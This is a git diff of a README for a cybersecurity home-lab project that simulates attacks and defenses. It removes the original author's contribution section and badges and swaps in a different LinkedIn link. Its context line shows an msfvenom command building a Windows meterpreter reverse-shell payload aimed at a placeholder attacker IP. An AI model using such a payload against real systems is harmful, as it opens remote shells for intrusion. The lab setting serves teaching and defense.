@@ -235,18 +235,6 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Attacker_IP> LPORT=4444 -
 - Implement **Wazuh SIEM** for better threat detection.
 
 ---
-## How to Contribute
-Interested in improving this project? Contributions are welcome!
-1. Fork the repository.
-2. Create a new branch with your improvements.
-3. Submit a pull request for review.
-
-### GitHub Repository Badges:
-![GitHub stars](https://img.shields.io/github/stars/xAHIINX00/SOC-Home-Lab-Attack-Defense-Simulation.svg)
-![GitHub forks](https://img.shields.io/github/forks/xAHIINX00/SOC-Home-Lab-Attack-Defense-Simulation.svg)
-![GitHub issues](https://img.shields.io/github/issues/xAHIINX00/SOC-Home-Lab-Attack-Defense-Simulation.svg)
-
----
 ## Conclusion
 This project demonstrates how to:
 - Set up a cybersecurity home lab
@@ -256,5 +244,4 @@ This project demonstrates how to:
 > **Note:** This is for educational purposes only. Do not use these techniques for unauthorized activities.
 
 ### 📌 Connect with Me:
-- [LinkedIn](https://www.linkedin.com/in/ahinsunil-m) 
-- [GitHub](https://github.com/xAHIINX00) 
+- [LinkedIn](https://www.linkedin.com/in/prajwal-kunte-008869313/) 
